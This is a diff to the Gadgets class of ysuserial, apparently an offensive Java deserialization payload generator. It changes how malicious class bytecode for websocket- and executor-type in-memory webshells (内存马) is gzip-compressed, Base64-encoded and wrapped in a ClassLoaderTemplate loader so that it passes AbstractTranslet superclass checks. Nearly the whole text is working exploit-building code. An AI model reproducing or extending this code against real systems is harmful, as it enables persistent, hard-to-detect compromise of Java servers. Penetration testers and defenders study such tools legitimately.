@@ -273,15 +273,26 @@ public class Gadgets {
 					// 测试方便调试暂时不改类名
 					ctClass.setName(className + System.nanoTime());
 				}
-				// websocket/executor 型内存马，使用 ClassLoaderTemplate 加载，不设置 AbstractTranslet 父类
+
+				// 配置恶意类不继承 AbstractTranslet 时，无需使用 ClassLoaderTemplate 进行封装
+				// 否则在恶意类自身存在父类时，无法继承 AbstractTranslet，需要使用 ClassLoaderTemplate 进行封装
+
+				// websocket/executor 型内存马，使用 ClassLoaderTemplate 加载
 				if (className.contains("WSMS")) {
 					insertKeyMethod(ctClass, "ws");
-					bytes = ctClass.toBytecode();
-					cName = ctClass.getName();
+
+					if (IS_INHERIT_ABSTRACT_TRANSLET) {
+						bytes = ctClass.toBytecode();
+						cName = ctClass.getName();
+					}
+
+
 				} else if (className.contains("EXMS")) {
 					insertKeyMethod(ctClass, "execute");
+
 					bytes = ctClass.toBytecode();
 					cName = ctClass.getName();
+
 					// 内存马指定类型进行写入恶意逻辑
 				} else if (!Objects.equals(cName, "")) {
 
@@ -291,7 +302,6 @@ public class Gadgets {
 
 					insertKeyMethod(ctClass, cName);
 				} else {
-
 					if (IS_INHERIT_ABSTRACT_TRANSLET) {
 						ctClass.setSuperclass(superClass);
 					}
@@ -306,24 +316,23 @@ public class Gadgets {
 		}
 		// 如果 bytes 不为空，则使用 ClassLoaderTemplate 加载任意恶意类字节码
 		if (bytes != null) {
-			// 如果恶意类继承 AbstractTranslet，则需要使用 ClassLoaderTemplate 封装，因为原有的恶意类可能自己有父类
+			ctClass = pool.get("org.su18.ysuserial.payloads.templates.ClassLoaderTemplate");
+			ctClass.setName(ctClass.getName() + System.nanoTime());
+			ByteArrayOutputStream outBuf           = new ByteArrayOutputStream();
+			GZIPOutputStream      gzipOutputStream = new GZIPOutputStream(outBuf);
+			gzipOutputStream.write(bytes);
+			gzipOutputStream.close();
+			String content   = "b64=\"" + Base64.encodeBase64String(outBuf.toByteArray()) + "\";";
+			String className = "className=\"" + cName + "\";";
+			ctClass.makeClassInitializer().insertBefore(content);
+			ctClass.makeClassInitializer().insertBefore(className);
+
 			if (IS_INHERIT_ABSTRACT_TRANSLET) {
-				ctClass = pool.get("org.su18.ysuserial.payloads.templates.ClassLoaderTemplate");
-				ctClass.setName(ctClass.getName() + System.nanoTime());
-				ByteArrayOutputStream outBuf           = new ByteArrayOutputStream();
-				GZIPOutputStream      gzipOutputStream = new GZIPOutputStream(outBuf);
-				gzipOutputStream.write(bytes);
-				gzipOutputStream.close();
-				String content   = "b64=\"" + Base64.encodeBase64String(outBuf.toByteArray()) + "\";";
-				String className = "className=\"" + cName + "\";";
-				ctClass.makeClassInitializer().insertBefore(content);
-				ctClass.makeClassInitializer().insertBefore(className);
 				ctClass.setSuperclass(superClass);
-				classBytes = ctClass.toBytecode();
-			} else {
-				// 如果恶意类不继承 AbstractTranslet，则无需使用恶意类封装，使用 _transletIndex 及 classCount 逻辑绕过父类校验
-				classBytes = bytes;
 			}
+
+			classBytes = ctClass.toBytecode();
+
 		}
 
 		// 写出 class 试试
